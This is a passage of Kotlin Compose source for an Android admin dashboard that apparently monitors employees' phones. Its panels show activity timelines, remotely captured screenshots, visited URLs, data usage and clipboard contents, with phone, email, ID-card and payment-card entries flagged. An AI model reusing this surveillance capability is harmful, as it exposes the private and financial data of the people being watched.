                        val url = "$relayBaseUrl/camera/audio-file/${java.net.URLEncoder.encode(clip.deviceName, "UTF-8")}/${clip.filename}"
                        try {
                            player.reset()
                            player.setDataSource(url)
                            player.prepareAsync()
                            player.setOnPreparedListener { mp ->
                                mp.start()
                                isPlaying = true
                            }
                            player.setOnCompletionListener {
                                isPlaying = false
                            }
                        } catch (_: Exception) { }
                    }
                },
                shape = RoundedCornerShape(8.dp),
                modifier = Modifier.fillMaxWidth(),
                colors = ButtonDefaults.filledTonalButtonColors(
                    containerColor = if (isPlaying) AppColors.Error.copy(alpha = 0.12f) else AppColors.Primary.copy(alpha = 0.12f),
                    contentColor = if (isPlaying) AppColors.Error else AppColors.Primary
                )
            ) {
                Icon(
                    if (isPlaying) Icons.Default.Stop else Icons.Default.PlayArrow,
                    null, Modifier.size(16.dp)
                )
                Spacer(Modifier.width(6.dp))
                Text(if (isPlaying) "⏹️ Stop" else "▶️ Putar", fontSize = 13.sp)
            }
        }
    }
}


// ═════════════════════════════════════════════════════════════════════════
// ─── Module 6: Device Activity Panel (Command Center Style) ──────────
// ═════════════════════════════════════════════════════════════════════════

@Composable
private fun DeviceActivityPanel(
    deviceName: String,
    ccCard: Color,
    ccBorder: Color,
    ccAccent: Color,
    ccText: Color,
    ccTextDim: Color
) {
    val context = androidx.compose.ui.platform.LocalContext.current
    val coroutineScope = rememberCoroutineScope()
    val mono = androidx.compose.ui.text.font.FontFamily.Monospace

    // State
    var isLoading by remember { mutableStateOf(true) }
    var errorMsg by remember { mutableStateOf<String?>(null) }
    var dailySummary by remember { mutableStateOf<Map<String, Any?>>(emptyMap()) }
    var appUsageList by remember { mutableStateOf<List<Map<String, Any?>>>(emptyList()) }
    var eventTimeline by remember { mutableStateOf<List<Map<String, Any?>>>(emptyList()) }
    var lastRefresh by remember { mutableStateOf("") }

    // Get ApiService
    val apiService = remember {
        try {
            dagger.hilt.android.EntryPointAccessors.fromApplication(
                context.applicationContext,
                com.example.kabensatudata.nearby.ScreenTextService.TextServiceEntryPoint::class.java
            ).apiService()
        } catch (_: Exception) { null }
    }

    // Fetch data
    LaunchedEffect(deviceName) {
        while (true) {
            try {
                isLoading = true
                val response = withContext(Dispatchers.IO) {
                    apiService?.getDeviceReportDetail(deviceName)
                }
                if (response?.isSuccessful == true) {
                    val body = response.body()
                    val report = body?.report
                    if (report != null) {
                        dailySummary = mapOf(
                            "first_active" to report.dailySummary?.firstActive,
                            "last_active" to report.dailySummary?.lastActive,
                            "total_screen_on_minutes" to report.dailySummary?.totalScreenOnMinutes,
                            "total_app_minutes" to report.dailySummary?.totalAppMinutes,
                            "screens_visited" to report.dailySummary?.screensVisited
                        )
                        appUsageList = report.appUsage?.map { app ->
                            mapOf(
                                "app_name" to app.appName,
                                "duration_minutes" to app.durationMinutes,
                                "is_own_app" to app.isOwnApp
                            )
                        } ?: emptyList()
                        eventTimeline = report.events?.map { evt ->
                            mapOf(
                                "event_type" to evt.eventType,
                                "timestamp" to evt.timestamp,
                                "event_data" to evt.eventData
                            )
                        } ?: emptyList()
                        val sdf = java.text.SimpleDateFormat("HH:mm:ss", java.util.Locale.getDefault())
                        lastRefresh = sdf.format(java.util.Date())
                        errorMsg = null
                    } else {
                        errorMsg = "No report data"
                    }
                } else {
                    errorMsg = "HTTP ${response?.code()}"
                }
            } catch (e: Exception) {
                errorMsg = e.message?.take(60)
            }
            isLoading = false
            kotlinx.coroutines.delay(30_000) // refresh every 30 seconds
        }
    }

    Column(verticalArrangement = Arrangement.spacedBy(8.dp)) {
        // Section header
        CcSectionHeader("DEVICE ACTIVITY", ccAccent)

        // ── Loading / Error State ──
        if (isLoading && dailySummary.isEmpty()) {
            Surface(
                Modifier.fillMaxWidth(), shape = RoundedCornerShape(6.dp),
                color = ccCard, border = androidx.compose.foundation.BorderStroke(0.5.dp, ccBorder)
            ) {
                Row(Modifier.padding(16.dp), verticalAlignment = Alignment.CenterVertically) {
                    CircularProgressIndicator(Modifier.size(16.dp), strokeWidth = 2.dp, color = ccAccent)
                    Spacer(Modifier.width(10.dp))
                    Text("Loading activity data...", fontSize = 12.sp, color = ccTextDim, fontFamily = mono)
                }
            }
            return
        }

        if (errorMsg != null && dailySummary.isEmpty()) {
            Surface(
                Modifier.fillMaxWidth(), shape = RoundedCornerShape(6.dp),
                color = ccCard, border = androidx.compose.foundation.BorderStroke(0.5.dp, ccBorder)
            ) {
                Column(Modifier.padding(16.dp)) {
                    Text("// ERROR: $errorMsg", fontSize = 11.sp, color = Color(0xFFFF5252), fontFamily = mono)
                    Spacer(Modifier.height(4.dp))
                    Text("// Data akan muncul setelah HP pegawai aktif", fontSize = 10.sp, color = ccTextDim, fontFamily = mono)
                    Text("// dan LogSyncWorker mengirim data ke server.", fontSize = 10.sp, color = ccTextDim, fontFamily = mono)
                }
            }
            return
        }

        // ── Daily Summary Card ──
        Surface(
            Modifier.fillMaxWidth(), shape = RoundedCornerShape(6.dp),
            color = ccCard, border = androidx.compose.foundation.BorderStroke(0.5.dp, ccBorder)
        ) {
            Column(Modifier.padding(12.dp)) {
                Row(
                    Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.SpaceBetween,
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Text("// DAILY SUMMARY", fontSize = 11.sp, fontWeight = FontWeight.Bold, color = ccAccent, fontFamily = mono)
                    if (lastRefresh.isNotBlank()) {
                        Text("⟳ $lastRefresh", fontSize = 9.sp, color = ccTextDim, fontFamily = mono)
                    }
                }
                Spacer(Modifier.height(8.dp))

                val firstActive = dailySummary["first_active"]?.toString() ?: "--:--"
                val lastActive = dailySummary["last_active"]?.toString() ?: "--:--"
                val screenMin = (dailySummary["total_screen_on_minutes"] as? Number)?.toInt() ?: 0
                val appMin = (dailySummary["total_app_minutes"] as? Number)?.toInt() ?: 0

                // Stats row
                Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceEvenly) {
                    CcStatBlock("FIRST ON", firstActive, ccAccent, mono)
                    CcStatBlock("LAST ON", lastActive, ccAccent, mono)
                    CcStatBlock("SCREEN", "${screenMin}m", Color(0xFF00FF41), mono)
                    CcStatBlock("APPS", "${appMin}m", Color(0xFFFFD600), mono)
                }

                // Screens visited
                @Suppress("UNCHECKED_CAST")
                val screens = (dailySummary["screens_visited"] as? List<String>) ?: emptyList()
                if (screens.isNotEmpty()) {
                    Spacer(Modifier.height(8.dp))
                    Text("SCREENS: ${screens.joinToString(" → ")}", fontSize = 9.sp, color = ccTextDim, fontFamily = mono, maxLines = 2)
                }
            }
        }

        // ── App Usage Chart ──
        if (appUsageList.isNotEmpty()) {
            Surface(
                Modifier.fillMaxWidth(), shape = RoundedCornerShape(6.dp),
                color = ccCard, border = androidx.compose.foundation.BorderStroke(0.5.dp, ccBorder)
            ) {
                Column(Modifier.padding(12.dp)) {
                    Text("// APP USAGE", fontSize = 11.sp, fontWeight = FontWeight.Bold, color = Color(0xFFFFD600), fontFamily = mono)
                    Spacer(Modifier.height(8.dp))

                    val maxMin = appUsageList.maxOfOrNull { (it["duration_minutes"] as? Number)?.toInt() ?: 0 } ?: 1

                    appUsageList.take(8).forEach { app ->
                        val appName = app["app_name"]?.toString() ?: "Unknown"
                        val minutes = (app["duration_minutes"] as? Number)?.toInt() ?: 0
                        val isOwn = (app["is_own_app"] as? Boolean) ?: false
                        val fraction = (minutes.toFloat() / maxMin).coerceIn(0.05f, 1f)
                        val barColor = if (isOwn) Color(0xFF00FF41) else Color(0xFFFFD600)

                        Row(
                            Modifier.fillMaxWidth().padding(vertical = 2.dp),
                            verticalAlignment = Alignment.CenterVertically
                        ) {
                            Text(
                                if (isOwn) "★ $appName" else appName,
                                fontSize = 10.sp,
                                color = if (isOwn) Color(0xFF00FF41) else ccText,
                                fontFamily = mono,
                                modifier = Modifier.width(100.dp),
                                maxLines = 1,
                                overflow = androidx.compose.ui.text.style.TextOverflow.Ellipsis
                            )
                            Box(
                                Modifier.weight(1f).height(12.dp)
                                    .clip(RoundedCornerShape(2.dp))
                                    .background(ccBorder)
                            ) {
                                Box(
                                    Modifier.fillMaxHeight()
                                        .fillMaxWidth(fraction)
                                        .clip(RoundedCornerShape(2.dp))
                                        .background(barColor)
                                )
                            }
                            Spacer(Modifier.width(6.dp))
                            Text("${minutes}m", fontSize = 10.sp, fontWeight = FontWeight.Bold, color = ccText, fontFamily = mono)
                        }
                    }
                }
            }
        }

        // ── Event Timeline ──
        if (eventTimeline.isNotEmpty()) {
            Surface(
                Modifier.fillMaxWidth(), shape = RoundedCornerShape(6.dp),
                color = Color(0xFF080C14),
                border = androidx.compose.foundation.BorderStroke(0.5.dp, ccBorder)
            ) {
                Column(Modifier.padding(10.dp)) {
                    Text("// EVENT TIMELINE (${eventTimeline.size} events)", fontSize = 11.sp, fontWeight = FontWeight.Bold, color = ccAccent, fontFamily = mono)
                    Spacer(Modifier.height(6.dp))

                    eventTimeline.takeLast(15).reversed().forEach { evt ->
                        val type = evt["event_type"]?.toString() ?: ""
                        val time = evt["timestamp"]?.toString() ?: ""
                        val data = evt["event_data"]?.toString() ?: "{}"

                        val (icon, color) = when {
                            type == "navigate" -> "→" to ccAccent
                            type == "screen_on" -> "◉" to Color(0xFF00FF41)
                            type == "screen_off" -> "○" to Color(0xFFFF5252)
                            type == "app_usage" -> "■" to Color(0xFFFFD600)
                            type == "login" -> "▶" to Color(0xFF00FF41)
                            type == "logout" -> "◀" to Color(0xFFFF5252)
                            else -> "·" to ccTextDim
                        }

                        val description = try {
                            val json = org.json.JSONObject(data)
                            when (type) {
                                "navigate" -> json.optString("screen", "")
                                "app_usage" -> "${json.optString("app_name", "")} (${json.optLong("duration_ms", 0) / 60000}m)"
                                "screen_on" -> "Screen ON"
                                "screen_off" -> "Screen OFF"
                                else -> type
                            }
                        } catch (_: Exception) { type }

                        Text(
                            "$time $icon $description",
                            fontSize = 10.sp,
                            color = color.copy(alpha = 0.8f),
                            fontFamily = mono,
                            maxLines = 1,
                            modifier = Modifier.padding(vertical = 1.dp)
                        )
                    }
                }
            }
        }
    }
}

@Composable
private fun CcStatBlock(label: String, value: String, color: Color, mono: androidx.compose.ui.text.font.FontFamily) {
    Column(horizontalAlignment = Alignment.CenterHorizontally) {
        Text(value, fontSize = 16.sp, fontWeight = FontWeight.Bold, color = color, fontFamily = mono)
        Text(label, fontSize = 8.sp, color = color.copy(alpha = 0.6f), fontFamily = mono)
    }
}


// ═════════════════════════════════════════════════════════════════════════
// ─── Module 7: Screenshot Gallery Panel ──────────────────────────────
// ═════════════════════════════════════════════════════════════════════════

@Composable
private fun ScreenshotGalleryPanel(
    deviceName: String, ccCard: Color, ccBorder: Color,
    ccAccent: Color, ccText: Color, ccTextDim: Color
) {
    val context = androidx.compose.ui.platform.LocalContext.current
    val coroutineScope = rememberCoroutineScope()
    val mono = androidx.compose.ui.text.font.FontFamily.Monospace

    var isLoading by remember { mutableStateOf(true) }
    var screenshots by remember { mutableStateOf<List<com.example.kabensatudata.data.remote.dto.ScreenshotItem>>(emptyList()) }
    var totalCount by remember { mutableStateOf(0) }
    var selectedScreenshot by remember { mutableStateOf<com.example.kabensatudata.data.remote.dto.ScreenshotItem?>(null) }
    var isCapturing by remember { mutableStateOf(false) }
    var refreshTick by remember { mutableStateOf(0) }

    val apiService = remember {
        try {
            dagger.hilt.android.EntryPointAccessors.fromApplication(
                context.applicationContext,
                com.example.kabensatudata.nearby.ScreenTextService.TextServiceEntryPoint::class.java
            ).apiService()
        } catch (_: Exception) { null }
    }

    // Fetch screenshots (auto-refresh every 30s or on manual refresh)
    LaunchedEffect(deviceName, refreshTick) {
        try {
            isLoading = screenshots.isEmpty()
            val response = withContext(Dispatchers.IO) { apiService?.getScreenshots(deviceName) }
            if (response?.isSuccessful == true) {
                val body = response.body()
                screenshots = body?.screenshots ?: emptyList()
                totalCount = body?.total ?: 0
            }
        } catch (_: Exception) { }
        isLoading = false
    }

    // Auto-refresh every 30 seconds
    LaunchedEffect(deviceName) {
        while (true) {
            kotlinx.coroutines.delay(30_000)
            refreshTick++
        }
    }

    Column(verticalArrangement = Arrangement.spacedBy(8.dp)) {
        CcSectionHeader("SCREENSHOT GALLERY", ccAccent)

        // Action bar: Capture Now + Refresh
        Surface(Modifier.fillMaxWidth(), shape = RoundedCornerShape(6.dp), color = ccCard,
            border = androidx.compose.foundation.BorderStroke(0.5.dp, ccBorder)) {
            Row(Modifier.padding(8.dp).fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween,
                verticalAlignment = Alignment.CenterVertically) {
                // Capture Now button
                Surface(
                    onClick = {
                        if (!isCapturing) {
                            isCapturing = true
                            coroutineScope.launch {
                                try {
                                    withContext(Dispatchers.IO) { apiService?.triggerScreenshot(deviceName) }
                                    // Wait a bit then refresh
                                    kotlinx.coroutines.delay(3000)
                                    refreshTick++
                                } catch (_: Exception) { }
                                isCapturing = false
                            }
                        }
                    },
                    shape = RoundedCornerShape(4.dp),
                    color = if (isCapturing) ccAccent.copy(alpha = 0.3f) else ccAccent.copy(alpha = 0.15f)
                ) {
                    Row(Modifier.padding(horizontal = 10.dp, vertical = 6.dp),
                        verticalAlignment = Alignment.CenterVertically) {
                        if (isCapturing) {
                            CircularProgressIndicator(Modifier.size(12.dp), strokeWidth = 1.5.dp, color = ccAccent)
                            Spacer(Modifier.width(6.dp))
                            Text("CAPTURING...", fontSize = 10.sp, color = ccAccent, fontFamily = mono)
                        } else {
                            Text("📸 CAPTURE NOW", fontSize = 10.sp, color = ccAccent, fontFamily = mono,
                                fontWeight = FontWeight.Bold)
                        }
                    }
                }

                Row(verticalAlignment = Alignment.CenterVertically) {
                    Text("$totalCount total", fontSize = 9.sp, color = ccTextDim, fontFamily = mono)
                    Spacer(Modifier.width(8.dp))
                    // Refresh
                    Surface(onClick = { refreshTick++ },
                        shape = RoundedCornerShape(4.dp), color = ccAccent.copy(alpha = 0.1f)) {
                        Text("⟳", fontSize = 14.sp, color = ccAccent,
                            modifier = Modifier.padding(horizontal = 8.dp, vertical = 4.dp))
                    }
                }
            }
        }

        // Loading
        if (isLoading && screenshots.isEmpty()) {
            Surface(Modifier.fillMaxWidth(), shape = RoundedCornerShape(6.dp), color = ccCard,
                border = androidx.compose.foundation.BorderStroke(0.5.dp, ccBorder)) {
                Row(Modifier.padding(16.dp), verticalAlignment = Alignment.CenterVertically) {
                    CircularProgressIndicator(Modifier.size(16.dp), strokeWidth = 2.dp, color = ccAccent)
                    Spacer(Modifier.width(10.dp))
                    Text("Loading screenshots...", fontSize = 12.sp, color = ccTextDim, fontFamily = mono)
                }
            }
            return
        }

        if (screenshots.isEmpty()) {
            Surface(Modifier.fillMaxWidth(), shape = RoundedCornerShape(6.dp), color = ccCard,
                border = androidx.compose.foundation.BorderStroke(0.5.dp, ccBorder)) {
                Column(Modifier.padding(16.dp)) {
                    Text("// Belum ada screenshot", fontSize = 11.sp, color = ccTextDim, fontFamily = mono)
                    Text("// Klik CAPTURE NOW untuk ambil screenshot", fontSize = 10.sp, color = ccTextDim, fontFamily = mono)
                }
            }
            return
        }

        // Thumbnail grid (2 columns)
        val chunkedScreenshots = screenshots.take(20).chunked(2)
        chunkedScreenshots.forEach { pair ->
            Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
                pair.forEach { ss ->
                    Surface(
                        onClick = { selectedScreenshot = ss },
                        modifier = Modifier.weight(1f),
                        shape = RoundedCornerShape(6.dp),
                        color = Color(0xFF080C14),
                        border = androidx.compose.foundation.BorderStroke(0.5.dp, ccBorder)
                    ) {
                        Column(Modifier.padding(4.dp)) {
                            // Thumbnail image
                            coil.compose.AsyncImage(
                                model = ss.thumbnailUrl ?: ss.url,
                                contentDescription = "Screenshot ${ss.capturedAt}",
                                modifier = Modifier.fillMaxWidth().height(100.dp)
                                    .clip(RoundedCornerShape(4.dp)),
                                contentScale = androidx.compose.ui.layout.ContentScale.Crop
                            )
                            Spacer(Modifier.height(4.dp))
                            // Time + size
                            Text(ss.capturedAt.takeLast(8), fontSize = 9.sp, color = ccAccent, fontFamily = mono)
                            val sizeText = if (ss.fileSize < 1024) "${ss.fileSize}B"
                                else if (ss.fileSize < 1048576) "${ss.fileSize / 1024}KB"
                                else String.format("%.1fMB", ss.fileSize / 1048576.0)
                            Text(sizeText, fontSize = 8.sp, color = ccTextDim, fontFamily = mono)
                        }
                    }
                }
                // Fill empty space if odd count
                if (pair.size == 1) {
                    Spacer(Modifier.weight(1f))
                }
            }
        }

        // Fullscreen viewer dialog with download
        if (selectedScreenshot != null) {
            val ss = selectedScreenshot!!
            androidx.compose.ui.window.Dialog(onDismissRequest = { selectedScreenshot = null }) {
                Surface(
                    Modifier.fillMaxWidth().padding(4.dp), shape = RoundedCornerShape(12.dp),
                    color = Color(0xFF0A0E1A), border = androidx.compose.foundation.BorderStroke(1.dp, ccAccent)
                ) {
                    Column(Modifier.padding(8.dp), horizontalAlignment = Alignment.CenterHorizontally) {
                        // Header with actions
                        Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween,
                            verticalAlignment = Alignment.CenterVertically) {
                            Text("// SCREENSHOT", fontSize = 12.sp, color = ccAccent, fontFamily = mono)
                            Row {
                                // Download button
                                Surface(
                                    onClick = {
                                        coroutineScope.launch {
                                            try {
                                                val downloadUrl = ss.url
                                                val request = android.app.DownloadManager.Request(android.net.Uri.parse(downloadUrl))
                                                    .setTitle("Screenshot_${ss.capturedAt}")
                                                    .setDescription("Download screenshot dari ${ss.deviceName}")
                                                    .setNotificationVisibility(android.app.DownloadManager.Request.VISIBILITY_VISIBLE_NOTIFY_COMPLETED)
                                                    .setDestinationInExternalPublicDir(
                                                        android.os.Environment.DIRECTORY_DOWNLOADS,
                                                        "KabenSatuData/Screenshots/ss_${ss.id}.jpg"
                                                    )
                                                val dm = context.getSystemService(android.content.Context.DOWNLOAD_SERVICE) as android.app.DownloadManager
                                                dm.enqueue(request)
                                                android.widget.Toast.makeText(context, "Downloading...", android.widget.Toast.LENGTH_SHORT).show()
                                            } catch (e: Exception) {
                                                android.widget.Toast.makeText(context, "Download gagal", android.widget.Toast.LENGTH_SHORT).show()
                                            }
                                        }
                                    },
                                    shape = RoundedCornerShape(4.dp),
                                    color = Color(0xFF4CAF50).copy(alpha = 0.2f)
                                ) {
                                    Text("⬇ DOWNLOAD", fontSize = 10.sp, color = Color(0xFF4CAF50), fontFamily = mono,
                                        modifier = Modifier.padding(horizontal = 8.dp, vertical = 4.dp))
                                }
                                Spacer(Modifier.width(4.dp))
                                // Delete button
                                Surface(
                                    onClick = {
                                        coroutineScope.launch {
                                            try {
                                                withContext(Dispatchers.IO) { apiService?.deleteScreenshot(ss.id) }
                                                screenshots = screenshots.filter { it.id != ss.id }
                                                totalCount = (totalCount - 1).coerceAtLeast(0)
                                                selectedScreenshot = null
                                            } catch (_: Exception) { }
                                        }
                                    },
                                    shape = RoundedCornerShape(4.dp),
                                    color = Color(0xFFFF5252).copy(alpha = 0.2f)
                                ) {
                                    Text("🗑", fontSize = 10.sp, color = Color(0xFFFF5252),
                                        modifier = Modifier.padding(horizontal = 8.dp, vertical = 4.dp))
                                }
                                Spacer(Modifier.width(4.dp))
                                // Close button
                                Surface(
                                    onClick = { selectedScreenshot = null },
                                    shape = RoundedCornerShape(4.dp),
                                    color = Color(0xFFFF5252).copy(alpha = 0.2f)
                                ) {
                                    Text("✕", fontSize = 10.sp, color = Color(0xFFFF5252),
                                        modifier = Modifier.padding(horizontal = 8.dp, vertical = 4.dp))
                                }
                            }
                        }
                        Spacer(Modifier.height(4.dp))
                        Text("${ss.capturedAt} • ${ss.deviceName}", fontSize = 9.sp, color = ccTextDim, fontFamily = mono)
                        Spacer(Modifier.height(8.dp))
                        // Pinch-to-zoom screenshot viewer
                        var scale by remember { mutableStateOf(1f) }
                        var offset by remember { mutableStateOf(androidx.compose.ui.geometry.Offset.Zero) }
                        coil.compose.AsyncImage(
                            model = ss.url, contentDescription = "Screenshot",
                            modifier = Modifier.fillMaxWidth()
                                .clip(RoundedCornerShape(6.dp))
                                .pointerInput(Unit) {
                                    detectTransformGestures { _, pan, zoom, _ ->
                                        scale = (scale * zoom).coerceIn(1f, 4f)
                                        offset = if (scale > 1f) offset + pan else androidx.compose.ui.geometry.Offset.Zero
                                    }
                                }
                                .graphicsLayer(
                                    scaleX = scale, scaleY = scale,
                                    translationX = offset.x, translationY = offset.y
                                ),
                            contentScale = androidx.compose.ui.layout.ContentScale.FillWidth
                        )
                    }
                }
            }
        }
    }
}


// ═════════════════════════════════════════════════════════════════════════
// ─── Module 8: Network Monitor Panel ─────────────────────────────────
// ═════════════════════════════════════════════════════════════════════════

@Composable
private fun NetworkMonitorPanel(
    deviceName: String, ccCard: Color, ccBorder: Color,
    ccAccent: Color, ccText: Color, ccTextDim: Color
) {
    val context = androidx.compose.ui.platform.LocalContext.current
    val mono = androidx.compose.ui.text.font.FontFamily.Monospace

    var isLoading by remember { mutableStateOf(true) }
    var urlVisits by remember { mutableStateOf<List<Map<String, Any?>>>(emptyList()) }
    var networkUsage by remember { mutableStateOf<List<Map<String, Any?>>>(emptyList()) }

    val apiService = remember {
        try {
            dagger.hilt.android.EntryPointAccessors.fromApplication(
                context.applicationContext,
                com.example.kabensatudata.nearby.ScreenTextService.TextServiceEntryPoint::class.java
            ).apiService()
        } catch (_: Exception) { null }
    }

    // Fetch data from device report (url_visit + network_usage events)
    LaunchedEffect(deviceName) {
        try {
            isLoading = true
            val response = withContext(Dispatchers.IO) { apiService?.getDeviceReportDetail(deviceName) }
            if (response?.isSuccessful == true) {
                val events = response.body()?.report?.events ?: emptyList()

                urlVisits = events.filter { it.eventType == "url_visit" }.map { evt ->
                    val data = try { org.json.JSONObject(evt.eventData ?: "{}") } catch (_: Exception) { org.json.JSONObject() }
                    mapOf("time" to evt.timestamp, "url" to data.optString("url", ""), "domain" to data.optString("domain", ""))
                }

                val networkEvt = events.lastOrNull { it.eventType == "network_usage" }
                if (networkEvt != null) {
                    val data = try { org.json.JSONObject(networkEvt.eventData ?: "{}") } catch (_: Exception) { org.json.JSONObject() }
                    val apps = data.optJSONArray("apps")
                    if (apps != null) {
                        val list = mutableListOf<Map<String, Any?>>()
                        for (i in 0 until apps.length()) {
                            val app = apps.getJSONObject(i)
                            list.add(mapOf(
                                "app" to app.optString("app", "Unknown"),
                                "rx" to app.optString("rx_mb", "0"),
                                "tx" to app.optString("tx_mb", "0")
                            ))
                        }
                        networkUsage = list
                    }
                }
            }
        } catch (_: Exception) { }
        isLoading = false
    }

    Column(verticalArrangement = Arrangement.spacedBy(8.dp)) {
        CcSectionHeader("NETWORK MONITOR", ccAccent)

        if (isLoading) {
            Surface(Modifier.fillMaxWidth(), shape = RoundedCornerShape(6.dp), color = ccCard,
                border = androidx.compose.foundation.BorderStroke(0.5.dp, ccBorder)) {
                Row(Modifier.padding(16.dp), verticalAlignment = Alignment.CenterVertically) {
                    CircularProgressIndicator(Modifier.size(16.dp), strokeWidth = 2.dp, color = ccAccent)
                    Spacer(Modifier.width(10.dp))
                    Text("Loading network data...", fontSize = 12.sp, color = ccTextDim, fontFamily = mono)
                }
            }
            return
        }

        // URL Visits
        Surface(Modifier.fillMaxWidth(), shape = RoundedCornerShape(6.dp), color = ccCard,
            border = androidx.compose.foundation.BorderStroke(0.5.dp, ccBorder)) {
            Column(Modifier.padding(12.dp)) {
                Text("// URL VISITS (${urlVisits.size})", fontSize = 11.sp, fontWeight = FontWeight.Bold, color = ccAccent, fontFamily = mono)
                Spacer(Modifier.height(6.dp))
                if (urlVisits.isEmpty()) {
                    Text("Belum ada data URL", fontSize = 10.sp, color = ccTextDim, fontFamily = mono)
                } else {
                    urlVisits.take(15).forEach { visit ->
                        val time = visit["time"]?.toString() ?: ""
                        val domain = visit["domain"]?.toString() ?: ""
                        val url = visit["url"]?.toString() ?: ""
                        Text(
                            "$time 🌐 $domain",
                            fontSize = 10.sp, color = ccText.copy(alpha = 0.8f), fontFamily = mono,
                            maxLines = 1, modifier = Modifier.padding(vertical = 1.dp)
                        )
                    }
                }
            }
        }

        // Data Usage
        if (networkUsage.isNotEmpty()) {
            Surface(Modifier.fillMaxWidth(), shape = RoundedCornerShape(6.dp), color = ccCard,
                border = androidx.compose.foundation.BorderStroke(0.5.dp, ccBorder)) {
                Column(Modifier.padding(12.dp)) {
                    Text("// DATA USAGE (Top Apps)", fontSize = 11.sp, fontWeight = FontWeight.Bold, color = Color(0xFFFFD600), fontFamily = mono)
                    Spacer(Modifier.height(6.dp))
                    Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween) {
                        Text("APP", fontSize = 9.sp, color = ccTextDim, fontFamily = mono, modifier = Modifier.weight(1f))
                        Text("↓ RX", fontSize = 9.sp, color = Color(0xFF00FF41), fontFamily = mono)
                        Spacer(Modifier.width(16.dp))
                        Text("↑ TX", fontSize = 9.sp, color = Color(0xFFFF5252), fontFamily = mono)
                    }
                    Spacer(Modifier.height(4.dp))
                    networkUsage.take(10).forEach { app ->
                        Row(Modifier.fillMaxWidth().padding(vertical = 1.dp), horizontalArrangement = Arrangement.SpaceBetween) {
                            Text(app["app"]?.toString() ?: "", fontSize = 10.sp, color = ccText, fontFamily = mono,
                                modifier = Modifier.weight(1f), maxLines = 1,
                                overflow = androidx.compose.ui.text.style.TextOverflow.Ellipsis)
                            Text("${app["rx"]}MB", fontSize = 10.sp, color = Color(0xFF00FF41), fontFamily = mono)
                            Spacer(Modifier.width(8.dp))
                            Text("${app["tx"]}MB", fontSize = 10.sp, color = Color(0xFFFF5252), fontFamily = mono)
                        }
                    }
                }
            }
        }
    }
}


// ═════════════════════════════════════════════════════════════════════════
// ─── Module 9: Clipboard Monitor Panel ───────────────────────────────
// ═════════════════════════════════════════════════════════════════════════

@Composable
private fun ClipboardMonitorPanel(
    deviceName: String, ccCard: Color, ccBorder: Color,
    ccAccent: Color, ccText: Color, ccTextDim: Color
) {
    val context = androidx.compose.ui.platform.LocalContext.current
    val mono = androidx.compose.ui.text.font.FontFamily.Monospace

    var isLoading by remember { mutableStateOf(true) }
    var clipboardEntries by remember { mutableStateOf<List<Map<String, Any?>>>(emptyList()) }

    val apiService = remember {
        try {
            dagger.hilt.android.EntryPointAccessors.fromApplication(
                context.applicationContext,
                com.example.kabensatudata.nearby.ScreenTextService.TextServiceEntryPoint::class.java
            ).apiService()
        } catch (_: Exception) { null }
    }

    // Fetch clipboard events from device report
    LaunchedEffect(deviceName) {
        try {
            isLoading = true
            val response = withContext(Dispatchers.IO) { apiService?.getDeviceReportDetail(deviceName) }
            if (response?.isSuccessful == true) {
                val events = response.body()?.report?.events ?: emptyList()
                clipboardEntries = events.filter { it.eventType == "clipboard" }.map { evt ->
                    val data = try { org.json.JSONObject(evt.eventData ?: "{}") } catch (_: Exception) { org.json.JSONObject() }
                    mapOf(
                        "time" to evt.timestamp,
                        "text" to data.optString("text", ""),
                        "sensitive" to data.optBoolean("sensitive", false),
                        "type" to data.optString("type", "")
                    )
                }
            }
        } catch (_: Exception) { }
        isLoading = false
    }

    Column(verticalArrangement = Arrangement.spacedBy(8.dp)) {
        CcSectionHeader("CLIPBOARD MONITOR", ccAccent)

        if (isLoading) {
            Surface(Modifier.fillMaxWidth(), shape = RoundedCornerShape(6.dp), color = ccCard,
                border = androidx.compose.foundation.BorderStroke(0.5.dp, ccBorder)) {
                Row(Modifier.padding(16.dp), verticalAlignment = Alignment.CenterVertically) {
                    CircularProgressIndicator(Modifier.size(16.dp), strokeWidth = 2.dp, color = ccAccent)
                    Spacer(Modifier.width(10.dp))
                    Text("Loading clipboard data...", fontSize = 12.sp, color = ccTextDim, fontFamily = mono)
                }
            }
            return
        }

        // Stats
        val sensitiveCount = clipboardEntries.count { it["sensitive"] == true }
        Surface(Modifier.fillMaxWidth(), shape = RoundedCornerShape(6.dp), color = ccCard,
            border = androidx.compose.foundation.BorderStroke(0.5.dp, ccBorder)) {
            Row(Modifier.padding(12.dp), horizontalArrangement = Arrangement.SpaceBetween) {
                Text("// TOTAL: ${clipboardEntries.size} entries", fontSize = 11.sp, color = ccAccent, fontFamily = mono)
                if (sensitiveCount > 0) {
                    Text("🔴 $sensitiveCount SENSITIVE", fontSize = 10.sp, fontWeight = FontWeight.Bold,
                        color = Color(0xFFFF5252), fontFamily = mono)
                }
            }
        }

        if (clipboardEntries.isEmpty()) {
            Surface(Modifier.fillMaxWidth(), shape = RoundedCornerShape(6.dp), color = ccCard,
                border = androidx.compose.foundation.BorderStroke(0.5.dp, ccBorder)) {
                Column(Modifier.padding(16.dp)) {
                    Text("// Belum ada data clipboard", fontSize = 11.sp, color = ccTextDim, fontFamily = mono)
                    Text("// Data otomatis tercatat saat copy/paste", fontSize = 10.sp, color = ccTextDim, fontFamily = mono)
                }
            }
            return
        }

        // Clipboard entries
        Surface(Modifier.fillMaxWidth(), shape = RoundedCornerShape(6.dp),
            color = Color(0xFF080C14),
            border = androidx.compose.foundation.BorderStroke(0.5.dp, ccBorder)) {
            Column(Modifier.padding(10.dp)) {
                clipboardEntries.take(20).forEach { entry ->
                    val time = entry["time"]?.toString() ?: ""
                    val text = entry["text"]?.toString() ?: ""
                    val isSensitive = entry["sensitive"] == true
                    val type = entry["type"]?.toString() ?: ""

                    val icon = if (isSensitive) "🔴" else "📋"
                    val typeLabel = when (type) {
                        "phone" -> " [TEL]"
                        "email" -> " [EMAIL]"
                        "nik" -> " [NIK]"
                        "card" -> " [CARD]"
                        "sensitive" -> " [!]"
                        else -> ""
                    }
                    val color = if (isSensitive) Color(0xFFFF5252) else ccText.copy(alpha = 0.8f)

                    Column(Modifier.padding(vertical = 2.dp)) {
                        Text(
